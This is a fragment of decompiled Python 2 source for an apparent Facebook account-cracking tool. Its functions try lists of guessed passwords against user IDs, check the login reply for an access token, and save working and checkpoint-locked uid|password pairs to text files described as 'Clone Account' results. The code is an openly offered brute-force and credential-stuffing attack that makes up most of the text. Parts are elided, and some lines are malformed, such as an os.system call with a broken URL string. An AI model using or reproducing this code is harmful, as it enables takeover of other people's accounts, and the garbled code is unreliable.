...
#Decompile by Sab ka Papa Aliya
...
def main_select():
    ...
    if SYED == '':
        ...
        os.system(''https://www.facebook.com/AliyakhanYosafzia)
        main()
    elif SYED == '3':
        os.system(''https://www.facebook.com/AliyakhanYosafzia)
        main()
...
def log_select():
    ...
    if sel == '2':
        ...
        os.system('python2 aliyaXwithout.py')
    elif sel == '4':
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[AliyakhanOK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Aliyakha.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[ALIYA] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('Aliyacp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[ALIYA OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[ALIYAOK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Aliyaok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[ALIYA] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Aliyacp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[ALIYAOK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Aliyaok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[ALIYAOK] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Aliyacp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[ALIYAOK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('Aliyaok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[ALIYA] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Aliyacp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[ALIYAOK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Aliyaok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[ALIYA] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Aliyacp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[ALIYA] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Aliyaok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[ALIYA] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Aliyacp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close() 
    ...
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: Aliyacp.txt'
    print 54 * '_'
    print ''
    print ''
...
def choice_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[ALIYAOK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Aliyaok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[ALIYAOK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Aliyaok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[ALIYA] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Aliyacp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[ALIYA] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Aliyaok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[ALIYA] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Aliyacp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'access_token' in q:
                                ...
                                if 'access_token' in q:
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[ALIYAOK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Aliyaok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
